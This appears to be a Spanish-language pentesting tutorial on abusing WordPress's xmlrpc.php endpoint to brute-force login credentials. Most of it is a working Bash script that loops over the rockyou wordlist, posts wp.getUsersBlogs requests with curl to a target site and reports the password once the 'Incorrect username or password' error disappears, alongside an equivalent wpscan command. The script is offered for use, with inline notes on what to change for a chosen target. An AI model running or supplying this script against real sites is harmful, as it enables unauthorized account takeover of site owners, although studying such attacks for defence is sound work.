
# Descripción

Cómo abusar del archivo **xmlrpc.php** para mediante la creación de un script de Bash aplicar fuerza bruta. El objetivo será demostrar cómo los atacantes pueden utilizar este archivo existente en WordPress para intentar descubrir credenciales válidas y comprometer la seguridad del sitio web.

Para lograrlo, crearemos un script de Bash en el cual emplearemos la herramienta curl para enviar solicitudes XML-RPC al archivo xmlrpc.php del sitio web WordPress. A través del método **wp.getUsersBlogs**, enviaremos una estructura XML que contendrá el nombre de usuario y la contraseña a probar.

En caso de que las credenciales no sean correctas, el servidor responderá con un mensaje de error que indica que las credenciales son incorrectas. Sin embargo, si las credenciales son válidas, la respuesta del servidor será diferente y no incluirá el mensaje de error.

De esta forma, podremos utilizar la respuesta del servidor para determinar cuándo hemos encontrado credenciales válidas y, de esta forma, tener acceso al sitio web de WordPress comprometido.


**El script es equivalente al siguiente comando de wpsscan para fuerza bruta:**

``wpscan --url https://ejemplo.com:80 -U usuario -P /usr/share/wordlists/rockyou.txt``



```bash
	#!/bin/bash

	function ctrl_c(){ 
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
	}
 

	# Ctrl+C
	trap ctrl_c SIGINT


	function createXML(){  
        password=$1
        xmlfile="""
	<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<methodCall>    
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>USER</value></param>                  <-- *Debemos ingresar el valor del usuario previamente descubierto*
	<param><value>$password</value></param>             
	</params> 
	</methodCall>"""


        echo $xmlfile > file.xml

        response=$(curl -s -X POST "https://ejemplo.com:80/xmlrpc.php" -d@file.xml)  <-- *debemos cambiar la direccion y puerto deseado y el nombre de archivo correspondiente*

        if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then  <-- *el tipo de respuesta según la que nos devuelva la página objetivo*
        echo -e "\n[+] La contraseña para el usuario es $password"
        exit 0
        fi
	}
 
	
	cat /usr/share/wordlists/rockyou.txt | while read password; do      <-- *Cambiaremos la ruta en caso de querer usar otro diccionario*
        createXML $password
	done
```
